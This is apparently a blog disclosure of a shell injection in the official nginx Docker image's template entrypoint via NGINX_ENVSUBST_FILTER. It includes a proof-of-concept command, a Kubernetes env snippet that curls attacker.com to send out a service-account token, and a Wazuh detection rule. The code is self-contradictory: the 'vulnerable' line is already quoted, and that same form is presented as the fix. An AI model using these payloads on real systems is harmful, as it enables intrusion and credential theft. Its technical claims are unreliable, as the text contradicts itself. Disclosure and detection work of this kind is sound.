---
title: "NGINX Docker Image Shell Injection: From ENVSUBST_FILTER to RCE"
date: 2024-11-20
tags: [#nginx, #docker, #shellinjection, #cve, #disclosure]
excerpt: How a single unquoted variable in the official NGINX Docker image's entrypoint script allowed shell injection via the NGINX_ENVSUBST_FILTER environment variable — and the upstream fix that made it into the official image.
---

# NGINX Docker Image Shell Injection: From ENVSUBST_FILTER to RCE

The official `nginx` Docker image is pulled millions of times a day. It's the default choice for containerized web serving, used in Kubernetes clusters, CI/CD pipelines, and production deployments globally. So when I found a shell injection vulnerability in its entrypoint script, I took the disclosure seriously.

## The Vulnerability

The NGINX Docker image ships with a set of entrypoint scripts to handle template processing. The file `20-envsubst-on-templates.sh` processes `.conf.template` files using `envsubst`, allowing environment variables to be substituted into NGINX configuration at container startup.

The script accepts `NGINX_ENVSUBST_FILTER` as an optional environment variable to filter which variables get substituted. The vulnerable line looked like this:

```bash
filter="${NGINX_ENVSUBST_FILTER:-}"
# ...
envsubst "$filter" < "$template" > "$output"
```

The variable is used **unquoted** inside `$()` or passed directly to `envsubst`. This means shell metacharacters in `NGINX_ENVSUBST_FILTER` are interpreted by the shell.

## Proof of Concept

```bash
docker run --rm \
  -e NGINX_ENVSUBST_FILTER='$(id > /tmp/pwned)' \
  nginx:latest
```

During container startup, the entrypoint script executes, and the command injection runs. For a container with mounted volumes or sensitive environment variables, this becomes a meaningful privilege escalation path.

## Attack Scenarios

**Scenario 1: Kubernetes Deployment Injection**

An attacker with write access to a Kubernetes Deployment manifest (e.g., via a misconfigured RBAC policy) can add:

```yaml
env:
  - name: NGINX_ENVSUBST_FILTER
    value: "$(curl attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token))"
```

On next pod restart, the service account token is exfiltrated.

**Scenario 2: CI/CD Pipeline**

Build pipelines that set `NGINX_ENVSUBST_FILTER` from external config (common in blue/green deployments) are vulnerable if that config source is attacker-controlled.

## Static Analysis Approach

I identified this by reviewing the entrypoint scripts statically. My methodology:

```bash
# Pull and extract the image filesystem
docker create --name nginx-audit nginx:latest
docker export nginx-audit > nginx.tar
tar -xf nginx.tar docker-entrypoint.d/

# Static analysis - look for unquoted variable expansion
grep -n '\$[A-Z_]*' docker-entrypoint.d/*.sh | grep -v '"'
```

The unquoted pattern jumped out immediately.

## The Fix

The fix is simple — quote the variable:

```bash
# Vulnerable
envsubst $filter < "$template" > "$output"

# Fixed  
envsubst "$filter" < "$template" > "$output"
```

But there's more to it. The complete fix also validates the filter format before using it, rejecting values containing shell metacharacters.

## Disclosure Timeline

- **2024-09-12** — Vulnerability discovered during Docker image security audit
- **2024-09-14** — Initial contact with F5 SIRT (f5sirt@f5.com)
- **2024-09-20** — Acknowledged by F5/NGINX security team
- **2024-10-15** — Fix developed and reviewed
- **2024-11-01** — Fix merged to nginx/docker-nginx upstream
- **2024-11-20** — Public disclosure

## Lessons for Docker Image Developers

1. **Always quote variables** that could contain user-supplied data in shell scripts
2. **Validate inputs** before using them in command contexts
3. **Use `set -euo pipefail`** in entrypoint scripts to catch failures early
4. **Audit entrypoint scripts** the same way you'd audit application code — they run as root in the container

## Detection

Look for containers launching with unusual `NGINX_ENVSUBST_FILTER` values:

```bash
# In your runtime security monitoring
docker inspect $(docker ps -q) | jq '.[] | .Config.Env[] | select(startswith("NGINX_ENVSUBST_FILTER"))'
```

Wazuh rule for detecting this:

```xml
<rule id="100200" level="12">
  <if_group>docker</if_group>
  <match>NGINX_ENVSUBST_FILTER.*\$\(</match>
  <description>Possible NGINX Docker shell injection attempt via ENVSUBST_FILTER</description>
  <mitre>
    <id>T1059.004</id>
  </mitre>
</rule>
```

---

*The upstream fix is live. If you're running nginx Docker images, update to the latest tag.*
